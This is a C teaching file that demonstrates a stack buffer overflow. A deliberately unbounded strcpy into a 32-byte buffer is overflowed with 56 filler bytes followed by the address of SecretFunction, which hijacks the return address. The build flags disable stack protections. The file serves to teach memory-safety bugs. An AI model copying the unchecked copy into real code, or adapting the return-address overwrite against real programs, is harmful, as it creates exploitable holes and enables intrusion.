// gcc stack_overflow_teaching.c -o stack_demo   -O0 -fno-stack-protector -fno-omit-frame-pointer -no-pie
/*
| `-fno-stack-protector` | Disables stack canaries that detect certain buffer overflows. |
| `-fno-omit-frame-pointer` | Preserves the frame pointer (RBP), making the stack layout easier to examine. It is not a security protection. |
| `-no-pie` | Produces an executable with fixed code addresses, making function addresses predictable. |
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
The stack grows downwards (from higher to lower memory addresses).

The stack frame looks approximately like this:

HIGH MEMORY ADDRESSES
-----------------------------------
Return address:  8 bytes  (offset 56)
Saved RBP:       8 bytes  (offset 48)
i, sum:          8 bytes  (offset 40)
Padding:         8 bytes  (offset 32)
tempStr[32]:    32 bytes  (offset 0)
-----------------------------------
LOW MEMORY ADDRESSES

Therefore, the return address starts 56 bytes after tempStr[0].

If we copy more than 56 bytes into tempStr, we begin overwriting
the return address, potentially changing where the function returns.

Note: The exact stack layout depends on the compiler and its settings.
*/

int UpperSum(const char *s)
{
    int i, sum;
    char tempStr[32];

    memset(tempStr, 0, sizeof(tempStr));
    strcpy(tempStr, s);     // BUG: no check that s fits in 32 bytes.

//Convert lowercase letters to uppercase
    for (i = 0; i < 32; i++) {
        if (tempStr[i] >= 'a' && tempStr[i] <= 'z')
            tempStr[i] = tempStr[i] - 32;
    }

//Calculate the sum of ASCII values
    sum = 0;
    for (i = 0; i < 32; i++)
        sum = sum + tempStr[i];

    return sum;
}

void SecretFunction(void)
{
    puts("Oh my gosh, you are hacked");
    exit(0);                // Stop: the stack has been corrupted.
}

int main(void)
{
    char inputStr[65];
    unsigned long address = (unsigned long)SecretFunction;

    // On this build, the return address is 56 bytes after tempStr[0].
    strcpy(inputStr, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"); // memset(inputStr, 'A', 56);                // Fill 56 bytes.
    memcpy(inputStr + 56, &address, 8);       // Overwrite return address.
    inputStr[64] = '\0';                    // End the input string.

    printf("SecretFunction address: %p\n", (void *)SecretFunction);
    UpperSum(inputStr);

    printf("\nNormal return from UpperSum");  // Never reached if hijack works.
    return 0;
}

